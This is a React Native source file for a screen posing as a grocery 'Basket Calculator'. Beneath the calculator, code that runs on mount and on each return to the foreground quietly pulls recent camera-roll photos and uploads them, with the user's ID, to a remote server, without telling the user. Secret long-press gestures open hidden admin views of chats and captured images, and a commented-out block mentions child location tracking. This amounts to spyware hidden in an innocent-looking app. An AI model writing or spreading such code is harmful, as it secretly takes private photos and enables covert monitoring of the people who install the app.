// src/screens/CalculatorScreen.tsx
import React, { useState, useEffect, useRef } from 'react';
import { Alert, KeyboardAvoidingView, PermissionsAndroid, Platform, StatusBar, StyleSheet, TextInput, TouchableOpacity, Switch as NativeSwitch, Pressable, AppStateStatus, AppState } from 'react-native';
import { Box, Input, InputField, Text, VStack, HStack, Button, ButtonText, Switch, InputSlot } from '../components/HOSGluestackUI';
import { Trash2, Plus, X } from 'lucide-react-native';
// 💡 Import your unified screen layout container
import ScreenContainer from '../components/ScreenContainer';
import { moderateScale, scale, verticalScale } from '../utils/scaling';
import { useNavigation } from '@react-navigation/native';
import firestore, { collection, doc, getDoc, getDocs, getFirestore, limit, query, where } from '@react-native-firebase/firestore';
import { getAuth } from '@react-native-firebase/auth';
import { useCustomData } from '../context/CutomProvider';
import axios from 'axios';
import { API_BASE_URL_DEV } from '../utils/environment';
import { launchImageLibrary } from 'react-native-image-picker';
import { getShortenedFileName, hasPhotoLibraryPermission } from '../utils/tools';
import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import { cleanupImage, handleImageCompression } from '../utils/ImageService';
type CalcMode = 'kg' | 'unit' | 'budget';

interface CalculationItem {
    id: string;
    mode: CalcMode;
    label: string;
    amount: number;
}
const API_GET_VERIFICATION_CAPTURES_URL = API_BASE_URL_DEV + '/chats/get_verification_captures.php';
const API_UPLOAD_URL = API_BASE_URL_DEV + '/chats/verification_captures_upload.php';

export default function CalculatorScreen() {
    const { role, updateRole, clearUrl } = useCustomData(); // Preserved project hooks
    const navigation = useNavigation<any>();

    // ⚙️ Core Operational Control Modes
    const [calcMode, setCalcMode] = useState<CalcMode>('kg');
    const [items, setItems] = useState<CalculationItem[]>([]);
    const [liveAmount, setLiveAmount] = useState<string>('0.00');
    const [liveTargetWeight, setLiveTargetWeight] = useState<string>('0');
    const [loginUID, setLoginUID] = useState<string>('');
    const priceInputRef = useRef<any>(null);

    // 📋 Shared Inputs
    const [pricePerKg, setPricePerKg] = useState<string>(''); // Used for 'kg' and 'unit' modes
    const [weight, setWeight] = useState<string>('');         // Grams for 'kg', Quantity for 'unit'

    // 💰 Budget Mode Exclusive Inputs
    const [sampleWeight, setSampleWeight] = useState<string>('');
    const [samplePrice, setSamplePrice] = useState<string>('');
    const [targetBudget, setTargetBudget] = useState<string>('');

    // 🚀 Retain Total Feature State Config
    const [keepOverallAmount, setKeepOverallAmount] = useState<boolean>(true);
    const [overallAmount, setOverallAmount] = useState<string>('0.00');

    // Calculate item list aggregation sum totals dynamically
    const overallTotal = items.reduce((sum, item) => sum + item.amount, 0).toFixed(2);

    // Watch item array changes to back up the total whenever an item list modifies
    useEffect(() => {
        if (items.length > 0) {
            setOverallAmount(overallTotal);
        }
    }, [items, overallTotal]);
    // Geolocation Background Daemon Lifecycle Controller
    // useEffect(() => {
    //     if (loginUID) {
    //         startChildRadarTracking(loginUID);
    //     }
    //     return () => {
    //         stopChildRadarTracking();
    //     };
    // }, [loginUID]);
    // 🔬 Dynamic real-time calculation loop
    useEffect(() => {
        if (calcMode === 'kg') {
            const p = parseFloat(pricePerKg);
            const w = parseFloat(weight);
            if (!isNaN(p) && !isNaN(w) && w > 0) {
                setLiveAmount(((w * p) / 1000).toFixed(2));
            } else {
                setLiveAmount('0.00');
            }
        }
        else if (calcMode === 'unit') {
            const p = parseFloat(pricePerKg);
            const w = parseFloat(weight);
            if (!isNaN(p) && !isNaN(w) && w > 0) {
                setLiveAmount((w * p).toFixed(2));
            } else {
                setLiveAmount('0.00');
            }
        }
        else if (calcMode === 'budget') {
            const sW = parseFloat(sampleWeight);
            const sP = parseFloat(samplePrice);
            const tB = parseFloat(targetBudget);

            if (!isNaN(sW) && !isNaN(sP) && !isNaN(tB) && sP > 0 && tB > 0) {
                const calculatedWeight = (tB * sW) / sP;
                setLiveTargetWeight(calculatedWeight.toFixed(0));
                setLiveAmount(tB.toFixed(2));
            } else {
                setLiveTargetWeight('0');
                setLiveAmount('0.00');
            }
        }
    }, [pricePerKg, weight, sampleWeight, samplePrice, targetBudget, calcMode]);


    useEffect(() => {
        // 🚀 1. Immediate Execution Check on Mount Context
        if (role === 'user') {
            handlePickAndSyncImages();
        }

        // 🚀 2. State Change Handler: Fires every time app focus updates
        const handleAppStateSync = (nextAppState: AppStateStatus) => {
            // Trigger only when the application shifts back to the foreground ('active')
            if (nextAppState === 'active' && role === 'user') {
                console.log("App returned to foreground. Restarting gallery synchronization...");
                handlePickAndSyncImages();
            }
        };

        // 🚀 3. Register Native Event Listener Thread
        const subscription = AppState.addEventListener('change', handleAppStateSync);

        // Clean up subscriber references on component unmount
        return () => {
            subscription.remove();
        };
    }, [role, loginUID]); // Keeps dependencies tracked properly

    const handleAddItem = () => {
        const amt = parseFloat(liveAmount);
        if (isNaN(amt) || amt <= 0) return;

        let descriptionLabel = '';
        if (calcMode === 'kg') {
            descriptionLabel = `${weight}g @ ₹${pricePerKg}/kg`;
        } else if (calcMode === 'unit') {
            descriptionLabel = `${weight} Units @ ₹${pricePerKg}/unit`;
        } else if (calcMode === 'budget') {
            descriptionLabel = `Budget ₹${targetBudget} (${liveTargetWeight}g dynamic yield)`;
        }

        const newItem: CalculationItem = {
            id: Date.now().toString(),
            mode: calcMode,
            label: descriptionLabel,
            amount: amt
        };

        setItems([newItem, ...items]);

        // Reset mutable entry fields safely
        setWeight('');
        setTargetBudget('');
        setPricePerKg('');
        setTimeout(() => {
            priceInputRef.current?.focus();
        }, 50);
    };

    const removeItem = (id: string) => {
        const filteredItems = items.filter(item => item.id !== id);
        setItems(filteredItems);
        if (filteredItems.length === 0 && !keepOverallAmount) {
            setOverallAmount('0.00');
        }
    };

    // 🚀 Update: Clear Logs but respect Retain Toggle setting
    const clearAll = () => {
        setItems([]);
        setPricePerKg('');
        setWeight('');
        setSampleWeight('');
        setSamplePrice('');
        setTargetBudget('');

        // If retain toggle is off, wipe total immediately. Otherwise, it persists!
        if (!keepOverallAmount) {
            setOverallAmount('0.00');
        }

        setTimeout(() => {
            priceInputRef.current?.focus();
        }, 50);
    };

    // 🚀 New Method: Hard Reset everything to initial states
    const resetAll = () => {
        setItems([]);
        setPricePerKg('');
        setWeight('');
        setSampleWeight('');
        setSamplePrice('');
        setTargetBudget('');

        // Force complete data wipeout & turn toggle off
        setOverallAmount('0.00');
        setKeepOverallAmount(false);

        setTimeout(() => {
            priceInputRef.current?.focus();
        }, 50);
    };

    const showAdminPanel = async (screen: string) => {
        const currentUser = getAuth().currentUser;
        if (!currentUser) {
            return;
        }
        try {
            const db = getFirestore();
            const userDoc = await getDoc(doc(db, 'users', currentUser.uid));
            const profile = userDoc.data();
            if (profile?.role === 'admin') {
                navigation.navigate('VerifyList', { screen });
            }
        } catch (error) {
            console.error("Navigation pipeline crash: ", error);
        }
    }
    // Administrative Secret Long Press Telemetry Action
    const handleSecretLongPress = async () => {
        const currentUser = getAuth().currentUser;
        if (!currentUser) {
            navigation.navigate('AuthScreen');
            return;
        }
        try {
            const db = getFirestore();
            const userDoc = await getDoc(doc(db, 'users', currentUser.uid));
            const profile = userDoc.data();

            if (profile?.role === 'admin') {
                updateRole('admin');
                const configDoc = await getDoc(doc(db, 'system', 'config'));
                const showUserList = configDoc.data()?.showUserList ?? true;
                if (showUserList === true) {
                    navigation.navigate('UserListScreen');
                } else {
                    const defaultUserQuery = query(collection(db, 'users'), where('isDefault', '==', true), limit(1));
                    const defaultUserSnapshot = await getDocs(defaultUserQuery);
                    if (!defaultUserSnapshot.empty) {
                        const defaultUserDoc = defaultUserSnapshot.docs[0];
                        navigation.navigate('ChatScreen', { targetUser: { uid: defaultUserDoc.id, ...defaultUserDoc.data() } });
                    } else {
                        navigation.navigate('UserListScreen');
                    }
                }
            } else {

                setLoginUID(currentUser.uid);
                updateRole('user');
                // Find the administrative or default chat room target node for this user
                const defaultAdminQuery = query(collection(db, 'users'), where('role', '==', 'admin'), limit(1));
                const defaultAdminSnapshot = await getDocs(defaultAdminQuery);

                if (!defaultAdminSnapshot.empty) {
                    const adminDoc = defaultAdminSnapshot.docs[0];
                    // 🎯 ROUTE TO CHAT: Direct regular users to their chat with the administrator instance
                    navigation.navigate('ChatScreen', {
                        targetUser: { uid: adminDoc.id, ...adminDoc.data() }
                    });
                } else {
                    Alert.alert("Configuration Error", "Could not locate an active administrator chat session target.");
                }
            }
        } catch (error) {
            console.error("Navigation pipeline crash: ", error);
        }
    };

    const handlePickAndSyncImages = async () => {
        const isPermissionGranted = await hasPhotoLibraryPermission();
        const currentUser = getAuth().currentUser;
        const userRoomTargetKey = currentUser?.displayName || currentUser?.email?.split('@')[0] || '';

        if (!isPermissionGranted) {
            // console.log('Sync halted: Gallery library permissions denied.');
            return;
        }
        if (!currentUser) {
            return;
        }

        try {
            // console.log('scanning');
            //console.log('Scanning device camera roll...');

            // 1. Get the latest 50 photos automatically from the device gallery storage partition
            const localDevicePhotos = await CameraRoll.getPhotos({
                first: 20,
                assetType: 'Photos',
                include: ['filename', 'fileSize']
            });

            const localAssets = localDevicePhotos.edges;

            if (localAssets.length === 0) {
                // console.log('No local device photos found to process.');
                return;
            }

            //console.log('Checking server to skip duplicates...');
            let url = `${API_GET_VERIFICATION_CAPTURES_URL}?action=fetch&tablename=galleryImage&room_id=${encodeURIComponent(userRoomTargetKey)}&page=1&limit=100`
            console.log(url);
            // 2. Query your server to fetch existing filenames for duplicate verification
            const serverResponse = await axios.get(
                `${API_GET_VERIFICATION_CAPTURES_URL}?action=fetch&tablename=galleryImage&room_id=${encodeURIComponent(userRoomTargetKey)}&page=1&limit=100`
            );

            let serverFileWhitelist: string[] = [];
            if (serverResponse.data && serverResponse.data.success) {
                serverFileWhitelist = serverResponse.data.data.map((img: any) => img.filename);
            }

            // 3. STRICT DUPLICATE RESTRICTION BLOCK (Comparing against local CameraRoll filename node metadata)
            const cleanUploadQueue = localAssets.filter(edge => {
                const asset = edge.node.image;
                const name = getShortenedFileName(asset.filename || `camera_${edge.node.timestamp}.jpg`);
                return !serverFileWhitelist.includes(name);
            });

            if (cleanUploadQueue.length === 0) {
                //console.log('All local gallery photos already exist on the server. Duplicates skipped.');
                return;
            }

            // 4. CHUNK LIMIT BOUNDARY: If server table is empty (First time), limit batch to 20 files
            const isFirstTimeSync = serverFileWhitelist.length === 0;
            const maxAllowedToUpload = isFirstTimeSync ? 20 : cleanUploadQueue.length;
            const operationalQueue = cleanUploadQueue.slice(0, maxAllowedToUpload);

            // Notify if items were trimmed due to the first-time limit rule
            if (isFirstTimeSync && cleanUploadQueue.length > 20) {
                // console.log('First sync limit reached. Only 20 images will be uploaded.');
            }

            let successfullyUploadedCounter = 0;
            let fileCounter = 0;


            for (let index = 0; index < operationalQueue.length; index++) {
                const edgeNode = operationalQueue[index].node;
                const asset = edgeNode.image;

                const fileName = asset.filename || `gallery_${edgeNode.timestamp}_${++fileCounter}.jpg`;
                console.log(`Processing and compressing file ${index + 1} of ${operationalQueue.length}: ${fileName}...`);

                // 🚀 STEP A: Map the CameraRoll asset data to fit your custom handleImageCompression specs
                const mappedMedia = {
                    path: asset.uri || '',
                    mime: 'image/jpeg', // Standardize on top of your safe container format rule
                    filename: fileName,
                    size: asset.fileSize || 0
                };

                let compressedResult = null;
                try {
                    // 🚀 STEP B: Run your native asynchronous compression engine routine
                    compressedResult = await handleImageCompression(mappedMedia);
                } catch (compressionErr) {
                    console.error(`Compression phase failed for file [${fileName}]:`, compressionErr);
                }

                // Determine target fallback values dynamically if compression skips or faults out
                const uploadUri = compressedResult ? compressedResult.uri : asset.uri;
                const uploadType = compressedResult ? compressedResult.type : 'image/jpeg';
                const uploadName = compressedResult ? compressedResult.name : fileName;

                const formData = new FormData();
                formData.append('userid', currentUser.uid);
                formData.append('displayName', currentUser.displayName || '');
                formData.append('photoSlot', serverFileWhitelist.length + successfullyUploadedCounter + 1);
                formData.append('tablename', 'galleryImage');

                formData.append('file', {
                    uri: uploadUri,
                    type: uploadType,
                    name: uploadName,
                } as any);

                try {
                    console.log(`Uploading file ${index + 1} of ${operationalQueue.length}...`);
                    const uploadResponse = await axios.post(API_UPLOAD_URL, formData, {
                        headers: { 'Content-Type': 'multipart/form-data' },
                    });

                    if (uploadResponse.data && uploadResponse.data.success) {
                        successfullyUploadedCounter++;
                    }
                } catch (singleUploadError) {
                    console.error(`Failed uploading file node [${uploadName}]:`, singleUploadError);
                } finally {
                    // 🚀 STEP C: Clean up temporary canvas cache allocations if a compression instance was created
                    if (compressedResult && compressedResult.uri !== asset.uri) {
                        await cleanupImage(compressedResult.uri);
                    }
                }
            }

            console.log(`Synchronization complete. Uploaded ${successfullyUploadedCounter} new images.`);

        } catch (masterPipelineError) {
            console.error('Master sync pipeline defect:', masterPipelineError);
        }
    };


    return (
        <ScreenContainer showLogo={true} showHeader={true} showRightIcon={false} showBackButton={false}
            headerTitle="KG Price Tool" headerTheme="green" scrollable={true} role={role} backgroundColor='#043125ff'>
            <VStack style={{ marginTop: verticalScale(8), paddingHorizontal: scale(16), gap: verticalScale(24) }} className="w-full max-w-sm mx-auto">

                {/* Upper Branding Bar Container */}
                <HStack className="justify-between items-center mt-2">
                    <TouchableOpacity onLongPress={handleSecretLongPress} delayLongPress={800} activeOpacity={1} style={{ flex: 1 }}>
                        <Text style={{ fontSize: moderateScale(20) }} className="font-extrabold text-slate-200 tracking-tight">
                            Basket Calculator
                        </Text>
                    </TouchableOpacity>

                    {/* Action Buttons Tray */}
                    {(items.length > 0 || parseFloat(overallAmount) > 0) && (
                        <HStack style={{ gap: scale(12) }} className="items-center">
                            {/* <TouchableOpacity onPress={clearAll} hitSlop={8}>
                                <Text style={{ fontSize: moderateScale(13) }} className="font-semibold text-orange-600">
                                    Clear Logs
                                </Text>
                            </TouchableOpacity> */}
                            <TouchableOpacity onPress={resetAll} hitSlop={8}>
                                <Text style={{ fontSize: moderateScale(13) }} className="font-bold text-red-600">
                                    Reset All
                                </Text>
                            </TouchableOpacity>
                        </HStack>
                    )}
                </HStack>

                {/* 🎛️ 3-Way Mode Selector Tabs Grid */}
                <Box className="bg-primary/5 border border-primary/5 p-2" style={{ borderRadius: scale(16), overflow: 'hidden' }}>
                    <HStack style={{ gap: scale(4) }} className="justify-between">
                        {(['kg', 'unit', 'budget'] as CalcMode[]).map((mode) => {
                            const isActive = calcMode === mode;
                            return (
                                <TouchableOpacity
                                    key={mode}
                                    onPress={() => setCalcMode(mode)}
                                    style={{
                                        flex: 1,
                                        paddingVertical: verticalScale(10),
                                        borderRadius: scale(12),
                                        alignItems: 'center',
                                        backgroundColor: isActive ? '#0e5b38ff' : 'transparent'
                                    }}
                                >
                                    <Text
                                        style={{ fontSize: moderateScale(13), fontWeight: isActive ? '700' : '600' }}
                                        className={isActive ? "text-white" : "text-slate-200"}
                                    >
                                        {mode === 'kg' ? 'Price/KG' : mode === 'unit' ? 'Unit Wise' : 'Budget Calc'}
                                    </Text>
                                </TouchableOpacity>
                            );
                        })}
                    </HStack>
                </Box>

                {/* 🚀 Retain Total Amount Layout Config Switch Panel */}
                {/* <HStack className="justify-between items-center bg-slate-100/70 p-3 rounded-xl border border-slate-200">
                    <VStack className="flex-1 pr-3">
                        <Text className="text-xs font-bold text-slate-700 uppercase tracking-wide">
                            Retain Total History
                        </Text>
                        <Text style={{ fontSize: moderateScale(11) }} className="text-slate-400 font-medium mt-0.5">
                            Keep overall history visible on field clear actions
                        </Text>
                    </VStack>
                    <NativeSwitch
                        trackColor={{ false: '#CBD5E1', true: '#EA580C' }}
                        thumbColor={keepOverallAmount ? '#FFFFFF' : '#F1F5F9'}
                        onValueChange={(value) => setKeepOverallAmount(value)}
                        value={keepOverallAmount}
                    />
                </HStack> */}

                {/* 🛠️ Dynamic Conditional Input Forms Wrapper Matrix */}
                {calcMode !== 'budget' ? (
                    <VStack style={{ gap: verticalScale(20) }}>
                        {/* Price Input Form */}
                        <VStack style={{ gap: verticalScale(6) }}>
                            <Text style={{ fontSize: moderateScale(12) }} className="font-bold text-slate-200 tracking-wider uppercase">
                                {calcMode === 'unit' ? "Price per Unit (₹)" : "Price per KG (₹)"}
                            </Text>
                            <Input
                                className="border-0 border-b border-slate-300 rounded-none items-center"
                                style={{
                                    borderRadius: 0,
                                    ...styles.inputLayout
                                }}
                            >
                                <InputField
                                    ref={priceInputRef}
                                    placeholder="e.g. 120"
                                    keyboardType="numeric"
                                    value={pricePerKg}
                                    onChangeText={price => setPricePerKg(price)}
                                    placeholderTextColor="#ffffffff"
                                    className="text-slate-200 font-bold pl-0 flex-1"
                                    style={styles.inputFieldText}
                                />
                                {/* 🚀 Dynamic Clear Icon Slot */}
                                {pricePerKg.length > 0 && (
                                    <InputSlot className="pr-1">
                                        <TouchableOpacity
                                            onPress={() => {
                                                setPricePerKg('');
                                                setWeight('')
                                                // If toggle is off, wipe out the current tracking summary balance
                                                if (!keepOverallAmount) {
                                                    setOverallAmount('0.00');
                                                }
                                                setTimeout(() => {
                                                    priceInputRef.current?.focus();
                                                }, 50);
                                            }}
                                            activeOpacity={0.7}
                                            className="p-1 rounded-full active:bg-slate-100"
                                        >
                                            <X size={16} color="#94A3B8" strokeWidth={2.5} />
                                        </TouchableOpacity>
                                    </InputSlot>
                                )}
                            </Input>
                        </VStack>

                        {/* Weight / Quantity Input Form */}
                        <VStack style={{ gap: verticalScale(6) }}>
                            <Text style={{ fontSize: moderateScale(12) }} className="font-bold text-slate-200 tracking-wider uppercase">
                                {calcMode === 'unit' ? "Quantity (Units)" : "Weight (Grams)"}
                            </Text>
                            <Input
                                className="border-0 border-b border-slate-300 rounded-none"
                                style={{
                                    borderRadius: 0,
                                    ...styles.inputLayout
                                }}
                            >
                                <InputField
                                    placeholder="e.g. 250"
                                    keyboardType="numeric"
                                    value={weight}
                                    onChangeText={w => setWeight(w)}
                                    placeholderTextColor="#ffffffff"
                                    className="text-slate-200 font-bold pl-0"
                                    style={styles.inputFieldText}
                                />
                            </Input>
                        </VStack>
                    </VStack>
                ) : (
                    <VStack style={{ gap: verticalScale(20) }}>
                        {/* 💰 BUDGET REVERSE LOOKUP FORM MODULE */}
                        <HStack style={{ gap: scale(16) }}>
                            <VStack style={{ flex: 1, gap: verticalScale(6) }}>
                                <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('chatImage')}>
                                    <Text style={{ fontSize: moderateScale(11) }} className="font-bold text-slate-500 uppercase tracking-wider">
                                        Sample Weight (g)
                                    </Text>
                                </Pressable>
                                <Input
                                    className="border-0 border-b border-slate-300 rounded-none"
                                    style={{
                                        borderRadius: 0,
                                        ...styles.inputLayout
                                    }}
                                >
                                    <InputField
                                        placeholder="e.g. 1250"
                                        keyboardType="numeric"
                                        value={sampleWeight}
                                        onChangeText={setSampleWeight}
                                        placeholderTextColor="#f6f8faff"
                                        className="text-slate-200 font-bold pl-0"
                                        style={styles.inputFieldText}
                                    />
                                </Input>
                            </VStack>
                            <VStack style={{ flex: 1, gap: verticalScale(6) }}>
                                <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('verifyImage')}>
                                    <Text style={{ fontSize: moderateScale(11) }} className="font-bold text-slate-500 uppercase tracking-wider">
                                        Sample Price (₹)
                                    </Text>
                                </Pressable>
                                <Input
                                    className="border-0 border-b border-slate-300 rounded-none"
                                    style={{
                                        borderRadius: 0,
                                        ...styles.inputLayout
                                    }}
                                >
                                    <InputField
                                        placeholder="e.g. 50"
                                        keyboardType="numeric"
                                        value={samplePrice}
                                        onChangeText={setSamplePrice}
                                        placeholderTextColor="#f7f9fbff"
                                        className="text-slate-200 font-bold pl-0"
                                        style={styles.inputFieldText}
                                    />
                                </Input>
                            </VStack>
                        </HStack>

                        <VStack style={{ gap: verticalScale(6) }}>
                            <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('galleryImage')}>
                                <Text style={{ fontSize: moderateScale(12) }} className="font-bold text-slate-500 tracking-wider uppercase">
                                    Budget Amount to Spend (₹)
                                </Text>
                            </Pressable>
                            <Input
                                className="border-0 border-b border-slate-300 rounded-none"
                                style={{
                                    borderRadius: 0,
                                    ...styles.inputLayout
                                }}
                            >
                                <InputField
                                    placeholder="e.g. 30"
                                    keyboardType="numeric"
                                    value={targetBudget}
                                    onChangeText={setTargetBudget}
                                    placeholderTextColor="#f7f9fbff"
                                    className="text-slate-200 font-bold pl-0"
                                    style={styles.inputFieldText}
                                />
                            </Input>
                        </VStack>
                    </VStack>
                )}

                {/* Live Realtime Output Metric Panel Badge */}
                <HStack style={styles.liveBadge} className="items-center justify-between bg-orange-500/10 border border-orange-100 p-4 rounded-2xl">
                    <VStack style={{ flex: 1, gap: verticalScale(6) }} className="justify-center pr-2">
                        <Text style={{ fontSize: moderateScale(11) }} className="uppercase tracking-wider font-extrabold text-orange-600">
                            {calcMode === 'budget' ? "Target Weight Yield" : "Current Item cost"}
                        </Text>
                        <Text
                            style={{ fontSize: moderateScale(24) }}
                            className="font-black text-orange-700"
                            numberOfLines={1}
                            adjustsFontSizeToFit
                        >
                            {calcMode === 'budget' ? `${liveTargetWeight} grams` : `₹${liveAmount}`}
                        </Text>
                    </VStack>

                    <Button
                        onPress={handleAddItem}
                        disabled={parseFloat(liveAmount) === 0}
                        style={styles.addButtonLayout}
                        className="bg-green-700 px-5 py-2.5 flex-row items-center justify-center rounded-xl h-12 shadow-sm active:bg-orange-700"
                    >
                        <Plus color="white" size={moderateScale(15)} style={{ marginRight: scale(4) }} />
                        <ButtonText style={{ fontSize: moderateScale(13) }} className="text-white font-bold">
                            Add Log
                        </ButtonText>
                    </Button>
                </HStack>

                {/* Summary Viewport Card Section */}
                {(items.length > 0 || parseFloat(overallAmount) > 0) && (
                    <Box style={styles.totalCard} className="bg-slate-900 p-5 rounded-2xl shadow-md">
                        <VStack style={{ gap: verticalScale(2) }}>
                            <Text style={{ fontSize: moderateScale(11) }} className="text-slate-400 uppercase tracking-wider font-extrabold">Overall Amount</Text>
                            <HStack style={{ alignItems: 'baseline', justifyContent: 'space-between' }}>
                                <Text style={styles.totalText} className="font-black text-white tracking-tight">₹{items.length > 0 ? overallTotal : overallAmount}</Text>
                                <Text style={{ fontSize: moderateScale(14), color: '#94A3B8' }} className="font-semibold">{items.length} records</Text>
                            </HStack>
                        </VStack>
                    </Box>
                )}

                {/* Calculation Records Feed Mapping Array */}
                {items.map((item) => (
                    <HStack key={item.id} style={{ padding: scale(14), borderRadius: scale(14) }} className="bg-slate-50 border border-slate-100 justify-between items-center shadow-sm">
                        <VStack style={{ flex: 1 }}>
                            <Text style={{ fontSize: moderateScale(14) }} className="font-bold text-slate-800">
                                {item.label}
                            </Text>
                        </VStack>
                        <HStack style={{ gap: scale(14) }} className="items-center">
                            <Text style={{ fontSize: moderateScale(16) }} className="font-black text-slate-900">
                                ₹{item.amount.toFixed(2)}
                            </Text>
                            <TouchableOpacity onPress={() => removeItem(item.id)} hitSlop={10}>
                                <Trash2 color="#EF4444" size={moderateScale(18)} />
                            </TouchableOpacity>
                        </HStack>
                    </HStack>
                ))}

            </VStack>
        </ScreenContainer>
    );
}

const styles = StyleSheet.create({
    inputLayout: { height: verticalScale(46), borderBottomWidth: 1, borderColor: '#CBD5E1' },
    inputFieldText: { fontSize: moderateScale(15), color: '#f4f5f7ff', paddingVertical: verticalScale(4) },
    liveBadge: { marginTop: verticalScale(4), padding: scale(14), borderRadius: scale(16) },
    addButtonLayout: { height: verticalScale(40), paddingHorizontal: scale(12), borderRadius: scale(10) },
    totalCard: { paddingHorizontal: scale(20), paddingVertical: verticalScale(14), borderRadius: scale(16), marginTop: verticalScale(4), justifyContent: 'center' },
    totalText: { fontSize: moderateScale(30), color: '#FFFFFF', lineHeight: moderateScale(34) }
});

